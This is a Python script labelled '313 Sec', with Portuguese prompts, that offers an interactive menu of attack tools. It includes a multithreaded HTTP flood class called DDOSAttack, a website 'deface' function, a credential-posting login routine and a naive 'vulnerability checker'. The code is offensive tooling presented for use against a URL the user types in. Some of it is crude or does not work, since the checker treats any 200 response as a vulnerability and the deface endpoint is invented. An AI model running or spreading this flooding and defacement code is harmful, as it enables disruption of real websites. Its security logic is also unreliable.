import requests
import threading
import time

class DDOSAttack:
    def __init__(self, url, method='GET', threads=100):
        self.url = url
        self.method = method.upper()
        self.threads = threads
        self.request_count = 0
        self.running = True

    def attack(self):
        while self.running:
            try:
                if self.method == 'GET':
                    response = requests.get(self.url, verify=False)
                elif self.method == 'POST':
                    response = requests.post(self.url, verify=False)
                self.request_count += 1
                print(f"Requisição enviada: {self.request_count} - Status: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"Erro ao enviar requisição: {e}")

    def start(self):
        print(f"Iniciando ataque DDoS em {self.url} com {self.threads} threads.")
        threads = []

        for _ in range(self.threads):
            thread = threading.Thread(target=self.attack)
            thread.start()
            threads.append(thread)

        for i in range(5, 0, -1):
            print(f"Iniciando em {i}...")
            time.sleep(1)

        for thread in threads:
            thread.join()

    def stop(self):
        self.running = False
        print("Ataque finalizado.")

class VulnerabilityChecker:
    def __init__(self, url):
        self.url = url
        self.vulnerabilities = {
            'PUT': self.url + '/upload',
            'POST': self.url + '/submit',
            'GET': self.url + '/?deface'
        }

    def check_vulnerabilities(self):
        for method, full_url in self.vulnerabilities.items():
            try:
                response = requests.head(full_url, verify=False)
                if response.status_code == 200:
                    print(f"Vulnerabilidade encontrada com {method}: {full_url}")
                else:
                    print(f"Vulnerabilidade não encontrada com {method}: {full_url}")
            except requests.exceptions.RequestException as e:
                print(f"Erro ao verificar {full_url}: {e}")

    def get_vulnerabilities(self):
        return self.vulnerabilities

class Deface:
    def __init__(self, url, payload):
        self.url = url
        self.payload = payload

    def execute(self):
        try:
            response = requests.post(self.url, data=self.payload, verify=False)
            if response.status_code == 200:
                print("Deface realizado com sucesso!")
            else:
                print("Falha ao realizar deface.")
        except requests.exceptions.RequestException as e:
            print(f"Erro ao realizar deface: {e}")

def buscar_login(url):
    print(f"Buscando logins em {url}...")
    login = input("Digite o login: ")
    password = input("Digite a senha: ")

    try:
        response = requests.post(f"{url}/auth/login", json={"login": login, "password": password}, verify=False)
        if response.status_code == 200:
            print("Login bem-sucedido!")
            print(f"Dados do usuário: {response.json()}")
        else:
            print("Falha no login: Verifique as credenciais.")
    except requests.exceptions.RequestException as e:
        print(f"Erro ao buscar login: {e}")

def painel():
    print("\nEscolha uma opção:")
    print("1: DDoS")
    print("2: Buscar Login")
    print("3: Buscar Vulnerável")
    print("4: UPD Flood (não implementado)")
    print("5: Entrar no Canal")
    print("6: Deface")
    opcao = input("Escolha uma opção: ")
    return opcao

def creditos():
    print("\n\n<font face='sans-serif' size='50' color='grey'><strong><i><b>313</b> Sec</i></strong></font>")

if __name__ == "__main__":
    creditos()
    while True:
        url = input("Digite a URL: ")
        opcao = painel()

        if opcao == '1':
            method = input("Escolha o método (GET/POST): ")
            threads = int(input("Número de threads: "))
            ddos_attack = DDOSAttack(url, method, threads)
            try:
                ddos_attack.start()
            except KeyboardInterrupt:
                ddos_attack.stop()

        elif opcao == '2':
            buscar_login(url)

        elif opcao == '3':
            checker = VulnerabilityChecker(url)
            checker.check_vulnerabilities()

        elif opcao == '6':
            payload = {'deface_text': input("Texto do deface: ")}
            deface_url = url + '/deface'  # Ajuste conforme necessário
            deface = Deface(deface_url, payload)
            deface.execute()

        else:
            print("Opção inválida. Tente novamente.")

        continuar = input("Deseja continuar? (s/n): ")
        if continuar.lower() != 's':
            break

